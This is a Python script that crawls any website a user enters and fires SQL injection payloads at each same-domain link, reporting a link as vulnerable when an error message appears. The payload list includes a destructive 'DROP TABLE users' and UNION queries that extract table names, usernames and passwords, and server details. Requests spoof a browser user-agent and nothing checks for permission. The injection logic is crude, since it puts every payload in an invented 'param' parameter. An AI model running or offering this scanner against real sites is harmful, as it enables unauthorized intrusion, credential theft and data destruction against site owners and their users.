import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from requests.exceptions import ConnectionError, Timeout

# Payloads for SQL Injection
payloads = [
    "';--",
    "' OR '1'='1';--",
    "'; DROP TABLE users;--",
    "' UNION SELECT null, null, null, table_name FROM information_schema.tables;--",
    "' AND 1=0 UNION SELECT user, password, null, null FROM users;--",
    "' UNION SELECT @@version, null, null, null;--",
    "' AND 1=0 UNION SELECT @@datadir, null, null, null;--",
    # Add more payloads here...
]

# Timeout in seconds for each request
request_timeout = 5  # You can adjust this value as needed

def is_vulnerable_to_sql_injection(link):
    print(f"Testing link: {link}")
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }
        response = requests.get(link, headers=headers, timeout=request_timeout)
        content_size = len(response.content)  # Size of the page content in bytes
        print(f"Size of the page content: {content_size} bytes")
        for payload in payloads:
            modified_link = urljoin(link, '?' + urlencode({'param': payload}))
            try:
                modified_response = requests.get(modified_link, headers=headers, timeout=request_timeout)
                if "error" in modified_response.text.lower() or "syntax error" in modified_response.text.lower():
                    print(f"Vulnerable link: {modified_link}")
                    break
            except (ConnectionError, Timeout):
                print(f"Timeout or Connection error occurred for link: {modified_link}")
        else:
            print("Not vulnerable.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def get_all_links_with_parameters(url):
    try:
        # Get the webpage content
        response = requests.get(url)
        response.raise_for_status()
        page_content = response.text
        
        # Convert the content to a BeautifulSoup object
        soup = BeautifulSoup(page_content, 'html.parser')
        
        # Extract all <a> tags with href attribute (links)
        all_links = soup.find_all('a', href=True)
        
        # List to store links with their GET parameters
        links_with_parameters = []
        
        # Extract links and their GET parameters from <a> tags
        for link in all_links:
            full_link = urljoin(url, link['href'])
            parsed_link = urlparse(full_link)
            if parsed_link.netloc == urlparse(url).netloc:
                parameters = parse_qs(parsed_link.query)
                links_with_parameters.append((full_link, parameters))
        
        return links_with_parameters
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return []

# Get the website URL from the user
website_url = input("Please enter the website URL: ")

# Extract all links and their GET parameters
all_links = get_all_links_with_parameters(website_url)

# Test each link for SQL Injection vulnerability
for link, _ in all_links:
    is_vulnerable_to_sql_injection(link)
